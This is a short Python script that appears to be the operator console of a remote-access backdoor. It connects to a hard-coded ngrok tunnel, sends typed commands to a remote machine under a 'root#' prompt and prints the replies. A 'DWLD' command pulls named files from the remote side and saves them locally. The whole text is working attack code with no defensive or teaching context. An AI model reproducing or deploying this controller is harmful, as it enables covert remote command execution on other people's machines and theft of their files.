from socket import *

host = '0.tcp.in.ngrok.io'
port = 19992
clientSocket = socket(AF_INET,SOCK_STREAM)
clientSocket.connect((host,port))
while True:
    command = input('root# ')
    clientSocket.send(command.encode())

    if command[:4] == "DWLD":
        tempPort =  clientSocket.recv(2048).decode()
        print('Receiving...')
        fileName = command.split()[1]
        print(fileName)
        
        tempClient = socket(AF_INET,SOCK_STREAM)
        tempClient.connect((host, int(tempPort)))
        
        data = b""
        downloadedBin = tempClient.recv(1048576)
        data += downloadedBin
        fileName += " DownLoaded"
        with open(fileName, "wb") as file:
            file.write(data)
        print('Done Recieving =)')
        tempClient.close()
        

    #recv from server
    print(clientSocket.recv(2048).decode())

clientSocket.close()
